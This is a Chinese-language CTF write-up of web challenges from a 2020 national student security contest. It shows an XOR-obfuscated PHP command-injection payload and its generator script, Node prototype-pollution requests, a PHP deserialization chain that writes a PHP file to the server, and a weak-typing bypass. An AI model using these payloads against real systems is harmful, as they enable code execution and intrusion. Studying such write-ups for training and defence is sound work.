---
title: 第十三届全国大学生信息安全竞赛 WEB Writeup
date: August 21st 2020
tags: [CTF, Writeup, PHP, Web安全]
summary: 第十三届全国大学生信息安全竞赛 Web 方向 Writeup，记录 easyphp 等题目的 fuzz 思路与漏洞利用过程。
---

# 第十三届全国大学生信息安全竞赛 WEB Writeup

## easyphp

fuzz寻找到一个符合参数条件的即可：

```plain
bool is_callable ( callable $name [, bool $syntax_only = false [, string &$callable_name ]] ) 
```

url：a=is_callable&b=phpinfo

## rceme

考点：无字符webshell  
异或绕过即可，异或字符生成脚本：

```php
$number='5'; 
$strings='system()'; 
$a=''; 
$strings=str_split($strings); 
foreach ($strings as $value) { 
    if(ord($number^$value)<127&&ord($number^$value)>32) 
    { 
        echo $value.":".($number^$value)."\n"; 
    } 
} 
```

payload：

```php
{if:('FlFAPX'^'555555')('cat /flag')}{end if} 
```

得到flag：flag{47cc2a08-52fc-45c7-a291-39cc0f3641fd}

## littlegame

考点：原型链污染  
npm instal的时候就会直接提示有原型链污染了

![](https://i.imgur.com/VfXbbA7.jpg)

在谷歌搜索到相关例子：

```javascript
const setFn = require('set-value'); 
const paths = [ 'constructor.prototype.a0', '__proto__.a1', ]; 
function check() { 
    for (const p of paths) { 
        setFn({}, p, true); 
    } for (let i = 0; i < paths.length; i++) { 
        if (({})[`a${i}`] === true) { 
            console.log(`Yes with ${paths[i]}`); 
        } 
    } 
} 
check();
```

在index.js中找到一个污染的点：

![](https://i.imgur.com/BptKOuy.jpg)

构造payload：

```plain
NewAttributeKey=constructor.prototype.abc&NewAttributeValue=sanzhi 
```

发送到：Privilege  
再直接去DeveloperControlPanel发送数据包如下得到flag

```plain
NewAttributeKey=constructor.prototype.abc&NewAttributeValue=sanzhi 
```

flag{993231b5-1deb-4836-bb03-56f42d34a8b0}

## babyunserialize

考点：反序列化

反序列化触发的魔术方法在Jig的destruct，构造poc如下：

```php
<?php 
namespace DB; 
    class Jig { 
        protected $data; 
        protected $lazy; 
        protected $dir; 
        function __construct(){ 
            $this->lazy = True; 
            $this->dir = "san"; 
            $this->data = array("zhi.php"=>array("path"=>"<?php phpinfo();?>")); 
        } 
    } 
$a = new Jig(); 
$poc = serialize($a); 
echo str_replace("*","%00*%00",$poc); 
?> 
```

序列化得到的结果：

```plain
O:6:"DB\Jig":3:{s:7:"%00*%00data";a:1:{s:7:"zhi.php";a:1:{s:4:"path";s:18:"";}}s:7:"%00*%00lazy";b:1;s:6:"%00*%00dir";s:3:"san";} 
```

生成出来的值没有`<?php phpinfo();?>`，手动添加上去。

```plain
O:6:"DB\Jig":3:{s:7:"%00*%00data";a:1:{s:7:"zhi.php";a:1:{s:4:"path";s:18:"<?php phpinfo();?>";}}s:7:"%00*%00lazy";b:1;s:6:"%00*%00dir";s:3:"san";} 
```

访问sanzhi.php，在phpinfo的界面搜索flag得到flag

flag{61b95766-7287-4fcd-842b-9b72c0b56518}

## easytrick

考点：弱类型的trick  
绕过点在于：

```php
if($this->trick1 !== $this->trick2 && md5($this->trick1) === md5($this->trick2) && $this->trick1 != $this->trick2){ 
```

用无穷大进行绕过：

```php
$a = new trick(); 
$a->trick1 = 1/0; 
$a->trick2 = INF; 
echo serialize($a); 
```

![](https://i.imgur.com/SCFf27X.jpg)

得到flag： flag{2a5ffe41-0725-4171-902f-f85d3ff1a451}